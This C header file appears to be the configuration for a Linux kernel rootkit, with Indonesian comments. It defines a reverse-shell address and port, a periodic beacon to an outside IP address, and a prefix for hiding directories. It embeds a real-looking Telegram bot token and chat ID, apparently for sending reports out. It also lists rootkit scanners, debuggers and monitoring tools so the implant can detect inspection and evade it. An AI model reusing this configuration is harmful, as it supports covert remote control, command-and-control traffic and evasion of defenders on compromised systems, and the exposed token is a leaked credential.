#ifndef HEADER_CONFIG
#define HEADER_CONFIG

#define REVERSE_SHELL_IP "127.0.0.1"
#define REVERSE_SHELL_PORT "5888"
#define BEACON_PAYLOAD "ROSE_BEACON"
#define BEACON_SEQ 0x1337
#define BEACON_ID 0xBEEF
#define BEACON_DEST_IP "107.152.44.183"
#define BEACON_PERIOD_MS 60000

/* === FILE PROTECTION === */
#define HIDE_DIR_PREFIX  "sylph"
#define PROTECTED_FILE      "/root/data.txt"
#define PROTECTED_CONTENT   "hello\n"
#define PROTECTED_CONTENT_LEN (sizeof(PROTECTED_CONTENT) - 1)

/* === HONEYPOT / TELEGRAM === */
#define TELEGRAM_BOT_TOKEN     "8448830099:AAECZF_1cKmSx75CTh5HYKzAFqU3GaK-AjM"      // Dari @BotFather
#define TELEGRAM_CHAT_ID       "-5436605002"        // ID chat/group tujuan
#define TELEGRAM_API_URL       "https://api.telegram.org/bot"
#define HONEYPOT_NETLINK_PORT 31                           // Netlink protocol number
#define HONEYPOT_NETLINK_GROUP 1                           // Netlink multicast group

/* Daftar keyword command mencurigakan (case-insensitive) */
#define SUSPICIOUS_CMDS   "lsmod,rmmod,insmod,modprobe,modinfo," \
                          "rkhunter,chkrootkit,lynis,tripwire,aide," \
                          "strace,ltrace,perf,gdb,objdump,readelf," \
                          "tcpdump,tshark,wireshark,netstat,ss," \
                          "lsof,fuser,ps,pstree,top,htop,atop," \
                          "journalctl,dmesg,kern.log,syslog," \
                          "aide,tripwire,ossec,samhain,unhide," \
                          "knark,adore,phalanx,diamorphine"

/* Keywords dalam argumen command yang mencurigakan */
#define SUSPICIOUS_KEYWORDS "/dev/,/boot/,/lib/modules,procs,kallsyms," \
                            "kcore,modules,version,maps,mem," \
                            "ftrace,debugfs,security,selinux,apparmor," \
                            "gradm,pax,grsec,execstack,asm,shellcode"

#endif
